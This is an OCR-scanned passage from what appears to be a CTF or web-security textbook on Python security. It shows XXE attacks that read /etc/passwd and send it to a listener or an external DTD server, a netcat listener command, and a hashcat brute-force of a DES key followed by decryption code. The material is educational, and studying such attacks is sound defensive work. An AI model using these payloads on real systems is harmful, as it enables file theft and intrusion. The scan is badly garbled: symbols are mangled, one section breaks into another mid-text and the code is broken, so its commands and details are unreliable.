---
## Page 242
3.2 Security Issues in Python
227
def characters (self, content) :
self chars += content
parser = MyContentHandler ()
print xml .sax.parseString (x, parser)
pzint xml sax.parseString (x1, parser)
Running this code will print out the contents of /etc/passwd and an HTTP request
will be received for 127.0.0.1:8005.
$ nc -1 8005
Host: 127.0.0.1:8005
GET /xnl .test HTrP/1. 0
User-Agent : Python-ur1lib/1.17
Accept: +/+
In addition to this case, sometimes the source program does not export the XML
data after parsing it, and it is not possible to get the desired content from the returned
result. In this case, we can use Blind XXE as an aftack method, again using various
operations on the XML entity, with the attack payload shown below.
1ENrITY $ file SYSTEH "file : ///etc/passvd*>
sdtd;
$send;
] >
Get the content of the target file using the file:/ or php:/filter and send the content
as an HTTP request to the server. Since parameter entities cannot be referenced in
entity definitions, we need to place the nested entity declarations in an extermal DTD
file, such as eval.dtd shown below.
eval. dtd:
++ ts=ee/xx*xxx*xx*xx/ / 1d, asxs p szx#* AI.ai >
ndxs, - 6eg 6
if unane == *admin' :
return
---
## Page 244
3.2 Security Issues in Python
229
( ( () auTa) u = nou
if (nov - u.ts >= 600) :
u.balance = 10000
u. count = 0
u.ts = now
session['balance*] = 10000
u.save ()
session['count*] = 0
Sapp router ( * /getfiag′ , methods= (* PosT′ , ))
def getfiag() :
@login_required
u= getattr(g. u′)
if not u or u.balance Bypassing Web Cache Poisoning
Countezmeasures
ca
href=*7s=b0b7a350f4a4f27848b204d056b25fb0f785e
6357390b3bc73bbbbffc6bf5071b47143690fe718f2
1d8 feb029243ed633882b1034e878984233b2d964a4138bbfe
4bcb8834342001d2446e0f6d464355833f3b6c3
9beee1bfd5d3bce98966870* >Bypassing WAFs and cracking xoR with
Hackvertor
It can be assumed that the mode used for encryption is ECB mode (since the same
string is encrypted with the same result if both the beginning and the end are
different). Then, based on what we now know.
•The length of the key is 64 bit, 8 characters, possibly DES encrypted.
All characters in the key are lowercase characters.
The encryption result for one of the 8 characters in *Bypassing W" may be
“3882b1034e878984”
We can try to blast the key. Since the 388... .984 string appears later, we should also
use the 8-bit window to blast “Bypassing W" as the plaintext, i.e., according to
“"assing+W", "passing+” (using "+”" is because the title might be url encoded) in the
order to attempt.
We use the hashcat tool.
> hashcat64 .exe -m 14000 3882b1034e878984 :617373696e672b57 -a 3 ?1717
1?1?l7171 -force
hashcat (v4.2.1) starting.- .
Minimum password length supported by kernel : 8
Maximum password length supported by kernel : 8
3882b1034e878984 :617373696e672b57:11dgonaro
The command "617373696e672b57" is the result of converting "assing+W" to a
HEX code. At the end of the run, we get a possible key “lldgonaro". Use this key to
decrypt the secret text.
from Crypto .Cipher import DES
key - '11dgonaro
dmport binascii
ciphertext = binascii.unhexlify
c1pher = DES .new (key, D&S .HODE_ECB)
(b"2e7e305f2da018a2cf8208fa1fefc238522c932a276554e5f8085ba33f96
00b301c3c95652a912b0342653ddcdc4703e5975bd2ff6cc8a133ca
print (cipher, decrypt (ciphertext)1
92.540eb2d0a42) *)
---
## Page 251